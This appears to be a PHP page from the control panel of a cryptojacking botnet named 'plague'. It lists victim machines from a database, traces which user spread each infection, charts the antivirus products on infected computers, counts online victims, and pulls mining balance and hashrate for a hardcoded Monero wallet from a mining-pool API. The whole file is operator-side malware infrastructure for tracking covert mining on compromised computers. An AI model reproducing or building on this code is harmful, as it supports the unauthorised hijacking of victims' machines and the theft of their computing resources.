<?php

$InfCount = array();
$Infections = array();
$AvCount = array();
$UserCount = 0;
$OnlineCount = 0;

function GetLabels($_Array){
	$S = "";
	foreach($_Array as $u => $c){
		$S .= "\"$u\", ";
	}
	$S = substr($S, 0, -2);
	return $S;
}

function GetCounts($_Array){
	$S = "";
	foreach($_Array as $u => $c){
		$S .= "$c, ";
	}
	$S = substr($S, 0, -2);
	return $S;
}

function GetColors($_Array){
	global $UserCount;
	$S = "";
	foreach($_Array as $u => $c){
		$Seed  = intval(hexdec(hash("crc32", $u))+ColorVar);
		srand($Seed);
		$S .= '"hsl(' . rand(0, 360) . ', 70%, 61%)", ';
	}
	$S = substr($S, 0, -2);
	srand();
	return $S;
}

function WhoInfected($GUID, $InfBy){
	global $InfCount, $Infections;
	if(!array_key_exists($InfBy, $InfCount)){ //If the InfectedBy value is not a user
		return WhoInfected($InfBy, $Infections[$InfBy]); //Then see who infected the computer which infected this computer
	} else return $InfBy;
}

include('data.php');
if(!ConnectDB('plague')){
	die('Failed to connect to the database.');
}

//Build user list
$Sql = "SELECT Username FROM users;";
$Result = $Conn->query($Sql);
if($Result->num_rows > 0){
	while($Entry = $Result->fetch_assoc()){
		$InfCount[$Entry['Username']] = 0;
		$UserCount++;
	}
}

//Build infection map
$Sql = "SELECT GUID, Antivirus, Infected, LastSeen FROM clients;";
$Result = $Conn->query($Sql);
if($Result->num_rows > 0){
	while($Entry = $Result->fetch_assoc()){
		if(IsOnline($Entry['LastSeen'], 5)) $OnlineCount++;
		if(!isset($AvCount[$Entry['Antivirus']]))
			$AvCount[$Entry['Antivirus']] = 1;
		else
			$AvCount[$Entry['Antivirus']]++;
		$Infections[$Entry['GUID']] = $Entry['Infected'];
	}
}

foreach($Infections as $x => $y){
	$InfCount[WhoInfected($x, $y)]++;
}

$Stats = json_decode(file_get_contents("http://p5.minexmr.com/get_wid_stats?address=45LShhsUY3qC4EguYcBnp4FZcQsTMH7gPYUbN1Q4P2GpfkSEppowERsCHFwPg5qyDvVajGCkonmfVMeJb9WiYNiNUPgWc6b"), true);
$Bal = number_format($Stats[0]["balance"]/pow(10, 12), 12);
$HV = 0.0;
foreach($Stats as $sObj){
	$HV += $sObj["hashrate"];
}
$HR = number_format($HV, 6);

?>
<canvas id="infectionChart" style="max-width: 49%; display: inline-block;"></canvas>
<canvas id="antivirusChart" style="max-width: 49%; display: inline-block;"></canvas>
<div style="height: 170px;"></div>
<p>Number of registered users: <font color="#aaf444"><?php echo($UserCount); ?></font></p>
<p>Number of infected clients: <font color="#aaf444"><?php echo($Result->num_rows); ?></font></p>
<p>Number of online clients: <font color="#aaf444"><?php echo($OnlineCount); ?></font></p>
<p>Number of offline clients: <font color="#f44444"><?php echo($Result->num_rows-$OnlineCount); ?></font></p><br>
<p>Mining address: <font style="font-family: monospace; font-size: 14px;">45LShhsUY3qC4EguYcBnp4FZcQsTMH7gPYUbN1Q4P2GpfkSEp<font color="#f44444">powER</font>sCHFwPg5qyDvVajGCkonmfVMeJb9WiYNiNUPgWc6b</font></p>
<p>Current balance: <font color="#aaf444"><?php
	echo($Bal);
?></font> XMR</p>
<p>Current hashrate: <font color="#aaf444"><?php
    echo($HR);
?></font> H/s</p>
<p><a style="color: #aaf444;" href="https://minexmr.com/#worker_stats" target="_blank">Check the Mining Statistics</a></p><br>
<p>Number of uploads: <font color="#aaf444"><?php
	$Dir = "uploads";
	$Files = scandir($Dir);
	$FileNum = count($Files)-2;
	echo($FileNum);
?></font></p>
<script src="scripts/Chart.min.js"></script>
<script>

var chartOptions = {
    title: {
        display: true,
		fontFamily: "Krub, sans-serif",
		fontColor: "#aaf444",
		fontSize: 15,
        text: ["Infection Spread Summary", ""]
    },
	legend: {
		position: "left",
		labels: {
			fontFamily: "Krub, sans-serif",
			fontColor: "#ffffff",
			fontSize: 13
		}
	}
};

var chartData = {
    labels: [<?php echo(GetLabels($InfCount)); ?>],
    datasets: [
      {
        label: "Infections",
        backgroundColor: [<?php echo(GetColors($InfCount)); ?>],
        data: [<?php echo(GetCounts($InfCount)); ?>]
      }
    ]
};

var ctx = $("#infectionChart");
var infChart = new Chart(ctx, {
    type: "doughnut",
    data: chartData,
    options: chartOptions
});

chartOptions["title"]["text"][0] = "Antivirus Statistics";
chartOptions["legend"]["position"] = "right";
var chartData2 = {
    labels: [<?php echo(GetLabels($AvCount)); ?>],
    datasets: [
      {
        label: "Infections",
        backgroundColor: [<?php echo(GetColors($AvCount)); ?>],
        data: [<?php echo(GetCounts($AvCount)); ?>]
      }
    ]
};

var cty = $("#antivirusChart");
var avChart = new Chart(cty, {
    type: "doughnut",
    data: chartData2,
    options: chartOptions
});

</script>
